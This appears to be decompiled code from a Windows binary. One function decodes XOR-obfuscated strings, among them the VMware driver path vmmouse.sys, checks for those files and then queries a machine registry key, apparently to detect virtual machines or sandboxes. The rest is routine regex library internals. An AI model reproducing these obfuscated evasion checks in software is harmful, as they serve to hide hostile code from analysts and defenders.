    local_348 = 0x4e285112;
    uStack836 = 0x767c7b45;
    uStack832 = 0x4e61657d;
    uStack828 = 0x66616b41;
    local_338 = 0x20217f77;
    uStack820 = 0x7b60764e;
    uStack816 = 0x61607764;
    uStack812 = 0x7f7f644e;
    local_328 = 0x7761677d;
    local_324 = 0x616b613c;
    uVar16 = uVar17;
    do {
      pbVar1 = (byte *)((longlong)&local_348 + uVar16 + 1);
      *pbVar1 = *pbVar1 ^ 0x12;
      uVar16 = uVar16 + 1;
    } while (uVar16 < 0x27);
    local_320 = 0;
    local_448 = (longlong)&local_348 + 1;
    FUN_1400023e8((undefined (*) [16])local_98,&local_448);
    bVar13 = true;
    bVar12 = true;
    bVar11 = true;
    bVar10 = false;
    bVar9 = false;
    bVar8 = false;
    bVar6 = false;
    bVar5 = false;
    bVar4 = false;
    bVar3 = false;
    bVar2 = false;
    local_440._0_4_ = 0xf;
    uVar16 = FUN_14000c3ec(local_98);
    if ((char)uVar16 != '\0') goto LAB_140007512;
    local_2e8 = 0xd6b1251;
    uStack740 = 0x353f3806;
    uStack736 = 0xd22263e;
    uStack732 = 0x25222802;
    local_2d8 = 0x63623c34;
    uStack724 = 0x3823350d;
    uStack720 = 0x22233427;
    uStack716 = 0x393c270d;
    local_2c8 = 0x7f223736;
    local_2c4 = 0x222822;
    uVar16 = uVar17;
    do {
      pbVar1 = (byte *)((longlong)&local_2e8 + uVar16 + 1);
      *pbVar1 = *pbVar1 ^ 0x51;
      uVar16 = uVar16 + 1;
    } while (uVar16 < 0x26);
    local_2c4 = local_2c4 & 0xffffff;
    local_448 = (longlong)&local_2e8 + 1;
    FUN_1400023e8((undefined (*) [16])local_b8,&local_448);
    bVar13 = true;
    bVar12 = true;
    bVar11 = true;
    bVar10 = true;
    bVar9 = false;
    bVar8 = false;
    bVar6 = false;
    bVar5 = false;
    bVar4 = false;
    bVar3 = false;
    bVar2 = false;
    local_440._0_4_ = 0x1f;
    uVar16 = FUN_14000c3ec(local_b8);
    if ((char)uVar16 != '\0') goto LAB_140007512;
    local_3a8 = 0x4e285112;
    uStack932 = 0x767c7b45;
    uStack928 = 0x4e61657d;
    uStack924 = 0x66616b41;
    local_398 = 0x20217f77;
    uStack916 = 0x7b60764e;
    uStack912 = 0x61607764;
    uStack908 = 0x7d70644e;
    local_388 = 0x677d7f6a;
    local_384 = 0x613c7761;
    local_380 = 0x616b;
    uVar16 = uVar17;
    do {
      pbVar1 = (byte *)((longlong)&local_3a8 + uVar16 + 1);
      *pbVar1 = *pbVar1 ^ 0x12;
      uVar16 = uVar16 + 1;
    } while (uVar16 < 0x29);
    local_37e = 0;
    local_448 = (longlong)&local_3a8 + 1;
    FUN_1400023e8((undefined (*) [16])local_d8,&local_448);
    bVar13 = true;
    bVar12 = true;
    bVar11 = true;
    bVar10 = true;
    bVar9 = true;
    bVar8 = false;
    bVar6 = false;
    bVar5 = false;
    bVar4 = false;
    bVar3 = false;
    bVar2 = false;
    local_440._0_4_ = 0x3f;
    uVar16 = FUN_14000c3ec(local_d8);
    if ((char)uVar16 != '\0') goto LAB_140007512;
    local_430 = 0x2a20271912740d4e;
    uStack1064 = 0x3a3d371d123d3921;
    local_420 = 0x273c2a127c7d232b;
    uStack1048 = 0x212c38123d3c2b38;
    local_410 = 0x2b3b2936;
    local_40c = 0x3d603a3d;
    local_408 = CONCAT13(local_408._3_1_,0x3d37);
    uVar16 = uVar17;
    do {
      pbVar1 = (byte *)((longlong)&local_430 + uVar16 + 1);
      *pbVar1 = *pbVar1 ^ 0x4e;
      uVar16 = uVar16 + 1;
    } while (uVar16 < 0x29);
    local_408 = local_408 & 0xff00ffff;
    local_448 = (longlong)&local_430 + 1;
    FUN_1400023e8((undefined (*) [16])local_f8,&local_448);
    bVar13 = true;
    bVar12 = true;
    bVar11 = true;
    bVar10 = true;
    bVar9 = true;
    bVar8 = true;
    bVar6 = false;
    bVar5 = false;
    bVar4 = false;
    bVar3 = false;
    bVar2 = false;
    local_440._0_4_ = 0x7f;
    uVar16 = FUN_14000c3ec(local_f8);
    if ((char)uVar16 != '\0') goto LAB_140007512;
    local_2c0 = 0x62047d3e;
    uStack700 = 0x5a505769;
    uStack696 = 0x624d4951;
    uStack692 = 0x4a4d476d;
    local_2b0 = 0xc0d535b;
    uStack684 = 0x574c5a62;
    uStack680 = 0x4d4c5b48;
    uStack676 = 0x5f485662;
    local_2a0 = 0x100a0846;
    local_29c = 0x4d474d;
    uVar16 = uVar17;
    do {
      pbVar1 = (byte *)((longlong)&local_2c0 + uVar16 + 1);
      *pbVar1 = *pbVar1 ^ 0x3e;
      uVar16 = uVar16 + 1;
    } while (uVar16 < 0x26);
    local_29c = local_29c & 0xffffff;
    local_448 = (longlong)&local_2c0 + 1;
    FUN_1400023e8((undefined (*) [16])local_118,&local_448);
    bVar13 = true;
    bVar12 = true;
    bVar11 = true;
    bVar10 = true;
    bVar9 = true;
    bVar8 = true;
    bVar6 = false;
    bVar5 = false;
    bVar4 = false;
    bVar3 = false;
    bVar2 = false;
    local_440._0_4_ = 0xff;
    uVar16 = FUN_14000c3ec(local_118);
    if ((char)uVar16 != '\0') goto LAB_140007512;
    local_270 = 0x4d2b5211;
    uStack620 = 0x757f7846;
    uStack616 = 0x4d62667e;
    uStack612 = 0x65626842;
    local_260 = 0x23227c74;
    uStack604 = 0x7863754d;
    uStack600 = 0x62637467;
    uStack596 = 0x7267794d;
    local_250 = 0x68623f72;
    local_24c = 0x62;
    uVar16 = uVar17;
    do {
      pbVar1 = (byte *)((longlong)&local_270 + uVar16 + 1);
      *pbVar1 = *pbVar1 ^ 0x11;
      uVar16 = uVar16 + 1;
    } while (uVar16 < 0x24);
    local_24c = local_24c & 0xff;
    local_448 = (longlong)&local_270 + 1;
    FUN_1400023e8((undefined (*) [16])local_138,&local_448);
    bVar13 = true;
    bVar12 = true;
    bVar11 = true;
    bVar10 = true;
    bVar9 = true;
    bVar8 = true;
    bVar6 = true;
    bVar5 = false;
    bVar4 = false;
    bVar3 = false;
    bVar2 = false;
    local_440._0_4_ = 0x1ff;
    uVar16 = FUN_14000c3ec(local_138);
    if ((char)uVar16 != '\0') goto LAB_140007512;
    local_298 = 0x3651c5f;
    uStack660 = 0x3b313608;
    uStack656 = 0x32c2830;
    uStack652 = 0x2b2c260c;
    local_288 = 0x6d6c323a;
    uStack644 = 0x362d3b03;
    uStack640 = 0x2c2d3a29;
    uStack636 = 0x33293703;
    local_278 = 0x712f3030;
    local_274 = 0x2c262c;
    uVar16 = uVar17;
    do {
      pbVar1 = (byte *)((longlong)&local_298 + uVar16 + 1);
      *pbVar1 = *pbVar1 ^ 0x5f;
      uVar16 = uVar16 + 1;
    } while (uVar16 < 0x26);
    local_274 = local_274 & 0xffffff;
    local_448 = (longlong)&local_298 + 1;
    FUN_1400023e8((undefined (*) [16])local_158,&local_448);
    bVar13 = true;
    bVar12 = true;
    bVar11 = true;
    bVar10 = true;
    bVar9 = true;
    bVar8 = true;
    bVar6 = true;
    bVar5 = true;
    bVar4 = false;
    bVar3 = false;
    bVar2 = false;
    local_440._0_4_ = 0x3ff;
    uVar16 = FUN_14000c3ec(local_158);
    if ((char)uVar16 != '\0') goto LAB_140007512;
    local_378 = 0x3a5c2566;
    uStack884 = 0x2080f31;
    uStack880 = 0x3a151109;
    uStack876 = 0x12151f35;
    local_368 = 0x54550b03;
    uStack868 = 0xf14023a;
    uStack864 = 0x15140310;
    uStack860 = 0xa14163a;
    local_358 = 0x150f1039;
    local_354 = 0x1f154803;
    local_350 = 0x15;
    uVar16 = uVar17;
    do {
      pbVar1 = (byte *)((longlong)&local_378 + uVar16 + 1);
      *pbVar1 = *pbVar1 ^ 0x66;
      uVar16 = uVar16 + 1;
    } while (uVar16 < 0x28);
    local_350 = local_350 & 0xff;
    local_448 = (longlong)&local_378 + 1;
    FUN_1400023e8((undefined (*) [16])local_178,&local_448);
    bVar13 = true;
    bVar12 = true;
    bVar11 = true;
    bVar10 = true;
    bVar9 = true;
    bVar8 = true;
    bVar6 = true;
    bVar5 = true;
    bVar4 = true;
    bVar3 = false;
    bVar2 = false;
    local_440._0_4_ = 0x7ff;
    uVar16 = FUN_14000c3ec(local_178);
    if ((char)uVar16 != '\0') goto LAB_140007512;
    local_3d8 = 0x4f295013;
    uStack980 = 0x777d7a44;
    uStack976 = 0x4f60647c;
    uStack972 = 0x67606a40;
    local_3c8 = 0x21207e76;
    uStack964 = 0x7a61774f;
    uStack960 = 0x60617665;
    uStack956 = 0x7f61634f;
    local_3b8 = 0x7c71654c;
    local_3b4 = 0x6561776b;
    local_3b0 = 0x606a603d;
    uVar16 = uVar17;
    do {
      pbVar1 = (byte *)((longlong)&local_3d8 + uVar16 + 1);
      *pbVar1 = *pbVar1 ^ 0x13;
      uVar16 = uVar16 + 1;
    } while (uVar16 < 0x2b);
    local_3ac = 0;
    local_448 = (longlong)&local_3d8 + 1;
    FUN_1400023e8((undefined (*) [16])local_198,&local_448);
    bVar13 = true;
    bVar12 = true;
    bVar11 = true;
    bVar10 = true;
    bVar9 = true;
    bVar8 = true;
    bVar6 = true;
    bVar5 = true;
    bVar4 = true;
    bVar3 = true;
    bVar2 = false;
    local_440._0_4_ = 0xfff;
    uVar16 = FUN_14000c3ec(local_198);
    if ((char)uVar16 != '\0') goto LAB_140007512;
    local_318 = 0x71176e2d;
    uStack788 = 0x4943447a;
    uStack784 = 0x715e5a42;
    uStack780 = 0x595e547e;
    local_308 = 0x1f1e4048;
    uStack772 = 0x445f4971;
    uStack768 = 0x5e5f485b;
    uStack764 = 0x415f5d71;
    local_2f8 = 0x4f5e5872;
    local_2f4 = 0x5e545e03;
    uVar16 = uVar17;
    do {
      pbVar1 = (byte *)((longlong)&local_318 + uVar16 + 1);
      *pbVar1 = *pbVar1 ^ 0x2d;
      uVar16 = uVar16 + 1;
    } while (uVar16 < 0x27);
    local_2f0 = 0;
    local_448 = (longlong)&local_318 + 1;
    FUN_1400023e8((undefined (*) [16])local_1b8,&local_448);
    bVar13 = true;
    bVar12 = true;
    bVar11 = true;
    bVar10 = true;
    bVar9 = true;
    bVar8 = true;
    bVar6 = true;
    bVar5 = true;
    bVar4 = true;
    bVar3 = true;
    bVar2 = true;
    local_440._0_4_ = 0x1fff;
    uVar16 = FUN_14000c3ec(local_1b8);
    bVar7 = false;
    if ((char)uVar16 != '\0') goto LAB_140007512;
  }
  else {
LAB_140007512:
    bVar7 = true;
  }
  if (bVar2) {
    FUN_14000b774(local_1b8);
  }
  if (bVar3) {
    FUN_14000b774(local_198);
  }
  if (bVar4) {
    FUN_14000b774(local_178);
  }
  if (bVar5) {
    FUN_14000b774(local_158);
  }
  if (bVar6) {
    FUN_14000b774(local_138);
  }
  if (bVar8) {
    FUN_14000b774(local_f8);
  }
  if (bVar9) {
    FUN_14000b774(local_d8);
  }
  if (bVar10) {
    FUN_14000b774(local_b8);
  }
  if (bVar11) {
    FUN_14000b774(local_98);
  }
  if (bVar12) {
    FUN_14000b774(local_78);
  }
  if (bVar13) {
    FUN_14000b774(local_58);
  }
  FUN_14000b774(local_38);
  if (!bVar7) {
    local_430 = 0x495a4c4f5d54481b;
    uStack1064 = 0x7e77787a6954475e;
    local_420 = 0x777a6e6f69724d47;
    uStack1048 = 0x687e6e5c3b637459;
    local_410 = 0x7f5a3b6f;
    local_40c = 0x726f727f;
    local_408 = 0x687574;
    uVar16 = uVar17;
    do {
      pbVar1 = (byte *)((longlong)&local_430 + uVar16 + 1);
      *pbVar1 = *pbVar1 ^ 0x1b;
      uVar16 = uVar16 + 1;
    } while (uVar16 < 0x2a);
    local_408 = local_408 & 0xffffff;
    LVar15 = RegOpenKeyExA((HKEY)0xffffffff80000002,(LPCSTR)((longlong)&local_430 + 1),0,0x20019,
                           &local_438);
    if (LVar15 != 0) {
      local_400 = 0x91a0c0f1d14085b;
      uStack1016 = 0x3e293a2c160d071e;
      local_3f0 = 0xd07753835127b77;
      uStack1000 = 0x340f7b3e293a2c16;
      local_3e0 = 0x283734;
      do {
        pbVar1 = (byte *)((longlong)&local_400 + uVar17 + 1);
        *pbVar1 = *pbVar1 ^ 0x5b;
        uVar17 = uVar17 + 1;
      } while (uVar17 < 0x22);
      local_3e0 = local_3e0 & 0xffffff;
      LVar15 = RegOpenKeyExA((HKEY)0xffffffff80000002,(LPCSTR)((longlong)&local_400 + 1),0,0x20019,
                             &local_438);
      if (LVar15 != 0) goto LAB_14000771e;
    }
    RegCloseKey(local_438);
  }
LAB_14000771e:
  FUN_14000eed0(local_18 ^ (ulonglong)auStackY1144);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_14000774c(void)

{
  _DAT_1400177c0 = GetClipboardSequenceNumber();
                    // WARNING: Could not recover jumptable at 0x000140007760. Too many branches
                    // WARNING: Treating indirect jump as call
  CloseClipboard();
  return;
}



void FUN_140007768(longlong param_1,undefined4 param_2)

{
  undefined8 *puVar1;
  undefined8 *puVar2;
  
  puVar1 = (undefined8 *)operator_new(0x28);
  puVar2 = (undefined8 *)0x0;
  if (puVar1 != (undefined8 *)0x0) {
    puVar1[2] = 0;
    puVar1[3] = 0;
    *puVar1 = std::_Node_back::vftable;
    puVar1[1] = 0xf;
    *(undefined4 *)(puVar1 + 4) = param_2;
    puVar2 = puVar1;
  }
  FUN_14000a578(param_1,(longlong)puVar2);
  return;
}



void FUN_1400077c4(longlong param_1)

{
  FUN_14000ac30(param_1,2);
  return;
}



void FUN_1400077d0(longlong param_1,char param_2)

{
  void **ppvVar1;
  uint uVar2;
  longlong lVar3;
  code *pcVar4;
  void *pvVar5;
  
  if ((*(int *)(*(longlong *)(param_1 + 8) + 8) != 6) ||
     ((*(byte *)(*(longlong *)(param_1 + 8) + 0xc) & 4) != 0)) {
    FUN_140008180(param_1);
  }
  if ((*(uint *)(param_1 + 0x10) & 0x100) == 0) {
    if ((*(uint *)(param_1 + 0x10) & 0x800) != 0) {
      param_2 = FUN_14000cf04(*(longlong ***)(param_1 + 0x18),param_2);
    }
  }
  else {
    param_2 = std::ctype<char>::tolower
                        (*(ctype_char_ **)(*(longlong *)(param_1 + 0x18) + 8),param_2);
  }
  lVar3 = *(longlong *)(param_1 + 8);
  uVar2 = *(uint *)(lVar3 + 0x24);
  ppvVar1 = (void **)(lVar3 + 0x28);
  if (*(uint *)(lVar3 + 0x20) < uVar2 || *(uint *)(lVar3 + 0x20) == uVar2) {
    pvVar5 = realloc(*ppvVar1,(ulonglong)(uVar2 + 0x10));
    if (pvVar5 == (void *)0x0) {
      std::_Xbad_alloc();
      pcVar4 = (code *)swi(3);
      (*pcVar4)();
      return;
    }
    *ppvVar1 = pvVar5;
    *(uint *)(lVar3 + 0x20) = uVar2 + 0x10;
  }
  *(char *)((ulonglong)*(uint *)(lVar3 + 0x24) + (longlong)*ppvVar1) = param_2;
  *(int *)(lVar3 + 0x24) = *(int *)(lVar3 + 0x24) + 1;
  return;
}



void FUN_140007884(longlong param_1,char param_2)

{
  void **ppvVar1;
  uint uVar2;
  longlong lVar3;
  code *pcVar4;
  uint *puVar5;
  void *pvVar6;
  
  if ((*(uint *)(param_1 + 0x10) & 0x100) != 0) {
    param_2 = std::ctype<char>::tolower
                        (*(ctype_char_ **)(*(longlong *)(param_1 + 0x18) + 8),param_2);
  }
  lVar3 = *(longlong *)(param_1 + 8);
  puVar5 = *(uint **)(lVar3 + 0x30);
  if (puVar5 == (uint *)0x0) {
    puVar5 = (uint *)operator_new(0x10);
    if (puVar5 == (uint *)0x0) {
      puVar5 = (uint *)0x0;
    }
    else {
      *puVar5 = 0;
      puVar5[1] = 0;
      *(undefined8 *)(puVar5 + 2) = 0;
    }
    *(uint **)(lVar3 + 0x30) = puVar5;
  }
  uVar2 = puVar5[1];
  ppvVar1 = (void **)(puVar5 + 2);
  if (*puVar5 < uVar2 || *puVar5 == uVar2) {
    pvVar6 = realloc(*ppvVar1,(ulonglong)(uVar2 + 0x10));
    if (pvVar6 == (void *)0x0) {
      std::_Xbad_alloc();
      pcVar4 = (code *)swi(3);
      (*pcVar4)();
      return;
    }
    *ppvVar1 = pvVar6;
    *puVar5 = uVar2 + 0x10;
  }
  *(char *)((ulonglong)puVar5[1] + (longlong)*ppvVar1) = param_2;
  puVar5[1] = puVar5[1] + 1;
  return;
}



void FUN_14000793c(longlong param_1,byte param_2)

{
  longlong lVar1;
  void *_Dst;
  
  if ((*(uint *)(param_1 + 0x10) & 0x100) != 0) {
    param_2 = std::ctype<char>::tolower
                        (*(ctype_char_ **)(*(longlong *)(param_1 + 0x18) + 8),param_2);
  }
  lVar1 = *(longlong *)(param_1 + 8);
  _Dst = *(void **)(lVar1 + 0x28);
  if (_Dst == (void *)0x0) {
    _Dst = operator_new(0x20);
    if (_Dst == (void *)0x0) {
      _Dst = (void *)0x0;
    }
    else {
      memset(_Dst,0,0x20);
    }
    *(void **)(lVar1 + 0x28) = _Dst;
  }
  *(byte *)((ulonglong)(param_2 >> 3) + (longlong)_Dst) =
       *(byte *)((ulonglong)(param_2 >> 3) + (longlong)_Dst) | (byte)(1 << (param_2 & 7));
  return;
}



void thunk_FUN_14000793c(longlong param_1,byte param_2)

{
  longlong lVar1;
  void *_Dst;
  
  if ((*(uint *)(param_1 + 0x10) & 0x100) != 0) {
    param_2 = std::ctype<char>::tolower
                        (*(ctype_char_ **)(*(longlong *)(param_1 + 0x18) + 8),param_2);
  }
  lVar1 = *(longlong *)(param_1 + 8);
  _Dst = *(void **)(lVar1 + 0x28);
  if (_Dst == (void *)0x0) {
    _Dst = operator_new(0x20);
    if (_Dst == (void *)0x0) {
      _Dst = (void *)0x0;
    }
    else {
      memset(_Dst,0,0x20);
    }
    *(void **)(lVar1 + 0x28) = _Dst;
  }
  *(byte *)((ulonglong)(param_2 >> 3) + (longlong)_Dst) =
       *(byte *)((ulonglong)(param_2 >> 3) + (longlong)_Dst) | (byte)(1 << (param_2 & 7));
  return;
}



void FUN_1400079d4(longlong param_1)

{
  undefined8 *puVar1;
  undefined8 *puVar2;
  
  puVar1 = (undefined8 *)operator_new(0x50);
  puVar2 = (undefined8 *)0x0;
  if (puVar1 != (undefined8 *)0x0) {
    puVar1[1] = 7;
    *puVar1 = std::_Node_class<char,class_std::regex_traits<char>_>::vftable;
    puVar1[2] = 0;
    puVar1[3] = 0;
    puVar1[4] = 0;
    puVar1[5] = 0;
    puVar1[6] = 0;
    puVar1[7] = 0;
    *(undefined2 *)(puVar1 + 8) = 0;
    puVar1[9] = 0;
    puVar2 = puVar1;
  }
  FUN_14000a578(param_1,(longlong)puVar2);
  return;
}



void FUN_140007a3c(longlong param_1,undefined *param_2,undefined *param_3,uint param_4)

{
  FUN_140008a78(param_1,param_2,param_3,param_4,(uint **)(*(longlong *)(param_1 + 8) + 0x20));
  return;
}



void FUN_140007a58(longlong param_1)

{
  FUN_14000ac30(param_1,5);
  return;
}



void FUN_140007b58(longlong param_1)

{
  FUN_14000ac30(param_1,3);
  return;
}



void FUN_140007b64(longlong param_1,void *param_2,void *param_3)

{
  size_t *psVar1;
  longlong lVar2;
  bool bVar3;
  int iVar4;
  undefined8 *_Buf1;
  void *pvVar5;
  undefined8 ****ppppuVar6;
  ulonglong uVar7;
  uint uVar8;
  ulonglong uVar9;
  undefined auStack168 [32];
  undefined local_88;
  undefined local_87 [7];
  void *local_80;
  undefined8 ****local_78 [2];
  size_t local_68;
  ulonglong local_60;
  void *local_58 [3];
  ulonglong local_40;
  ulonglong local_38;
  
  local_38 = DAT_140017038 ^ (ulonglong)auStack168;
  lVar2 = *(longlong *)(param_1 + 8);
  FUN_140004c94(*(longlong ***)(param_1 + 0x18),local_78,param_2,param_3);
  uVar9 = 0;
  do {
    local_88 = (undefined)uVar9;
    _Buf1 = (undefined8 *)FUN_140004c94(*(longlong ***)(param_1 + 0x18),local_58,&local_88,local_87)
    ;
    uVar7 = local_60;
    ppppuVar6 = local_78;
    if (0xf < local_60) {
      ppppuVar6 = local_78[0];
    }
    psVar1 = _Buf1 + 2;
    if (0xf < (ulonglong)_Buf1[3]) {
      _Buf1 = (undefined8 *)*_Buf1;
    }
    if (*psVar1 == local_68) {
      iVar4 = memcmp(_Buf1,ppppuVar6,*psVar1);
      if (iVar4 != 0) goto LAB_140007bf4;
      bVar3 = true;
    }
    else {
LAB_140007bf4:
      bVar3 = false;
    }
    if (0xf < local_40) {
      pvVar5 = local_58[0];
      if ((0xfff < local_40 + 1) &&
         (pvVar5 = *(void **)((longlong)local_58[0] + -8),
         0x1f < (ulonglong)((longlong)local_58[0] + (-8 - (longlong)pvVar5)))) {
                    // WARNING: Subroutine does not return
        _invalid_parameter_noinfo_noreturn();
      }
      free(pvVar5);
      uVar7 = local_60;
    }
    if (bVar3) {
      pvVar5 = *(void **)(lVar2 + 0x28);
      if (pvVar5 == (void *)0x0) {
        pvVar5 = operator_new(0x20);
        local_80 = pvVar5;
        if (pvVar5 == (void *)0x0) {
          pvVar5 = (void *)0x0;
        }
        else {
          memset(pvVar5,0,0x20);
        }
        *(void **)(lVar2 + 0x28) = pvVar5;
      }
      *(byte *)((uVar9 >> 3) + (longlong)pvVar5) =
           *(byte *)((uVar9 >> 3) + (longlong)pvVar5) | (byte)(1 << ((uint)uVar9 & 7));
      uVar7 = local_60;
    }
    uVar8 = (uint)uVar9 + 1;
    uVar9 = (ulonglong)uVar8;
    if (0xff < uVar8) {
      if (0xf < uVar7) {
        ppppuVar6 = local_78[0];
        if ((0xfff < uVar7 + 1) &&
           (ppppuVar6 = (undefined8 ****)local_78[0][-1],
           0x1f < (ulonglong)((longlong)local_78[0] + (-8 - (longlong)ppppuVar6)))) {
                    // WARNING: Subroutine does not return
          _invalid_parameter_noinfo_noreturn();
        }
        free(ppppuVar6);
      }
      FUN_14000eed0(local_38 ^ (ulonglong)auStack168);
      return;
    }
  } while( true );
}



void FUN_140007cfc(longlong param_1,ushort param_2,char param_3)

{
  longlong lVar1;
  void *_Dst;
  ulonglong uVar2;
  uint uVar3;
  ulonglong uVar4;
  bool bVar5;
  
  lVar1 = *(longlong *)(param_1 + 8);
  uVar4 = 0;
  uVar2 = 0;
  do {
    if (param_2 == 0xffff) {
      if (((char)uVar4 == '_') ||
         ((*(ushort *)
            (*(longlong *)(*(longlong *)(*(longlong *)(param_1 + 0x18) + 8) + 0x18) +
            (uVar4 & 0xff) * 2) & 0x107) != 0)) {
        bVar5 = true;
      }
      else {
        bVar5 = false;
      }
    }
    else {
      bVar5 = (*(ushort *)
                (*(longlong *)(*(longlong *)(*(longlong *)(param_1 + 0x18) + 8) + 0x18) +
                (uVar4 & 0xff) * 2) & param_2) != 0;
    }
    if (bVar5 != (bool)param_3) {
      _Dst = *(void **)(lVar1 + 0x28);
      if (_Dst == (void *)0x0) {
        _Dst = operator_new(0x20);
        if (_Dst == (void *)0x0) {
          _Dst = (void *)0x0;
        }
        else {
          memset(_Dst,0,0x20);
        }
        *(void **)(lVar1 + 0x28) = _Dst;
      }
      *(byte *)((uVar2 >> 3) + (longlong)_Dst) =
           *(byte *)((uVar2 >> 3) + (longlong)_Dst) | (byte)(1 << ((uint)uVar4 & 7));
    }
    uVar3 = (uint)uVar4 + 1;
    uVar4 = (ulonglong)uVar3;
    uVar2 = uVar2 + 1;
  } while (uVar3 < 0x100);
  return;
}



void FUN_140007d0c(longlong param_1,byte param_2,byte param_3)

{
  void **ppvVar1;
  longlong lVar2;
  code *pcVar3;
  char cVar4;
  uint uVar5;
  uint uVar6;
  void *pvVar7;
  uint *puVar8;
  uint uVar9;
  uint uVar10;
  
  if ((*(uint *)(param_1 + 0x10) & 0x100) == 0) {
    uVar10 = (uint)param_2;
    uVar9 = (uint)param_3;
  }
  else {
    cVar4 = std::ctype<char>::tolower(*(ctype_char_ **)(*(longlong *)(param_1 + 0x18) + 8),param_2);
    uVar10 = (uint)cVar4;
    cVar4 = std::ctype<char>::tolower(*(ctype_char_ **)(*(longlong *)(param_1 + 0x18) + 8),param_3);
    uVar9 = (uint)cVar4;
  }
  lVar2 = *(longlong *)(param_1 + 8);
  if (uVar10 <= uVar9) {
    do {
      uVar5 = FUN_140009f4c(param_1);
      if (uVar5 <= uVar9) break;
      pvVar7 = *(void **)(lVar2 + 0x28);
      if (pvVar7 == (void *)0x0) {
        pvVar7 = operator_new(0x20);
        if (pvVar7 == (void *)0x0) {
          pvVar7 = (void *)0x0;
        }
        else {
          memset(pvVar7,0,0x20);
        }
        *(void **)(lVar2 + 0x28) = pvVar7;
      }
      uVar5 = uVar10 >> 3;
      uVar6 = uVar10 & 7;
      uVar10 = uVar10 + 1;
      *(byte *)((ulonglong)uVar5 + (longlong)pvVar7) =
           *(byte *)((ulonglong)uVar5 + (longlong)pvVar7) | (byte)(1 << uVar6);
    } while (uVar10 <= uVar9);
    if (uVar10 <= uVar9) {
      uVar5 = FUN_140009fe0(param_1);
      if (uVar9 - uVar10 < uVar5) {
        do {
          FUN_140007884(param_1,(char)uVar10);
          uVar10 = uVar10 + 1;
        } while (uVar10 <= uVar9);
      }
      else {
        puVar8 = *(uint **)(lVar2 + 0x38);
        if (puVar8 == (uint *)0x0) {
          puVar8 = (uint *)operator_new(0x10);
          if (puVar8 == (uint *)0x0) {
            puVar8 = (uint *)0x0;
          }
          else {
            *puVar8 = 0;
            puVar8[1] = 0;
            *(undefined8 *)(puVar8 + 2) = 0;
          }
          *(uint **)(lVar2 + 0x38) = puVar8;
        }
        uVar5 = puVar8[1];
        ppvVar1 = (void **)(puVar8 + 2);
        if (*puVar8 < uVar5 || *puVar8 == uVar5) {
          pvVar7 = realloc(*ppvVar1,(ulonglong)(uVar5 + 0x10));
          if (pvVar7 == (void *)0x0) {
            std::_Xbad_alloc();
            pcVar3 = (code *)swi(3);
            (*pcVar3)();
            return;
          }
          *ppvVar1 = pvVar7;
          *puVar8 = uVar5 + 0x10;
        }
        *(char *)((ulonglong)puVar8[1] + (longlong)*ppvVar1) = (char)uVar10;
        puVar8[1] = puVar8[1] + 1;
        puVar8 = *(uint **)(lVar2 + 0x38);
        uVar10 = puVar8[1];
        ppvVar1 = (void **)(puVar8 + 2);
        if (*puVar8 < uVar10 || *puVar8 == uVar10) {
          pvVar7 = realloc(*ppvVar1,(ulonglong)(uVar10 + 0x10));
          if (pvVar7 == (void *)0x0) {
            std::_Xbad_alloc();
            pcVar3 = (code *)swi(3);
            (*pcVar3)();
            return;
          }
          *ppvVar1 = pvVar7;
          *puVar8 = uVar10 + 0x10;
        }
        *(char *)((ulonglong)puVar8[1] + (longlong)*ppvVar1) = (char)uVar9;
        puVar8[1] = puVar8[1] + 1;
      }
    }
  }
  return;
}



void FUN_140007eb4(longlong *param_1,int param_2,int param_3,byte param_4)

{
  int iVar1;
  undefined8 uVar2;
  uint uVar3;
  undefined8 *puVar4;
  undefined8 *puVar5;
  undefined8 *puVar6;
  undefined8 *puVar7;
  undefined8 *puVar8;
  undefined8 *puVar9;
  longlong lVar10;
  
  lVar10 = param_1[1];
  if ((*(int *)(lVar10 + 8) == 6) && (*(int *)(lVar10 + 0x24) != 1)) {
    uVar3 = *(int *)(lVar10 + 0x24) - 1;
    *(uint *)(lVar10 + 0x24) = uVar3;
    FUN_1400077d0((longlong)param_1,*(char *)(*(longlong *)(lVar10 + 0x28) + (ulonglong)uVar3));
  }
  lVar10 = param_1[1];
  if ((*(int *)(lVar10 + 8) == 9) || (*(int *)(lVar10 + 8) == 0xe)) {
    lVar10 = *(longlong *)(lVar10 + 0x20);
  }
  puVar8 = (undefined8 *)0x0;
  if ((param_2 == 0) && (param_3 == 1)) {
    puVar4 = (undefined8 *)operator_new(0x20);
    puVar9 = puVar8;
    if (puVar4 != (undefined8 *)0x0) {
      puVar4[1] = 0x11;
      puVar4[2] = 0;
      puVar4[3] = 0;
      *puVar4 = std::_Node_endif::vftable;
      puVar9 = puVar4;
    }
    puVar5 = (undefined8 *)operator_new(0x30);
    puVar4 = puVar8;
    if (puVar5 != (undefined8 *)0x0) {
      puVar5[1] = 0x10;
      puVar5[2] = 0;
      puVar5[3] = 0;
      *puVar5 = std::_Node_if::vftable;
      puVar5[4] = puVar9;
      puVar5[5] = 0;
      puVar4 = puVar5;
    }
    puVar6 = (undefined8 *)operator_new(0x30);
    puVar5 = puVar8;
    if (puVar6 != (undefined8 *)0x0) {
      puVar6[1] = 0x10;
      puVar6[2] = 0;
      puVar6[3] = 0;
      *puVar6 = std::_Node_if::vftable;
      puVar6[4] = puVar9;
      puVar6[5] = 0;
      puVar5 = puVar6;
    }
    puVar7 = (undefined8 *)operator_new(0x20);
    puVar6 = puVar8;
    if (puVar7 != (undefined8 *)0x0) {
      puVar7[1] = 8;
      *puVar7 = std::_Node_base::vftable;
      puVar7[2] = 0;
      puVar7[3] = 0;
      puVar6 = puVar7;
    }
    puVar7 = (undefined8 *)operator_new(0x28);
    if (puVar7 != (undefined8 *)0x0) {
      puVar7[1] = 9;
      *puVar7 = std::_Node_end_group::vftable;
      puVar7[2] = 0;
      puVar7[3] = 0;
      puVar7[4] = puVar6;
      puVar8 = puVar7;
    }
    puVar5[2] = puVar6;
    puVar6[3] = puVar5;
    puVar6[2] = puVar8;
    puVar8[3] = puVar6;
    puVar8[2] = puVar9;
    puVar4[5] = puVar5;
    FUN_14000a578((longlong)param_1,(longlong)puVar9);
    FUN_14000a2d8(lVar10,(longlong)puVar4);
    if (param_4 == 0) {
      lVar10 = puVar5[2];
      uVar2 = *(undefined8 *)(puVar4[2] + 0x18);
      *(undefined8 *)(puVar4[2] + 0x18) = *(undefined8 *)(lVar10 + 0x18);
      *(undefined8 *)(lVar10 + 0x18) = uVar2;
      uVar2 = puVar4[2];
      puVar4[2] = puVar5[2];
      puVar5[2] = uVar2;
    }
  }
  else {
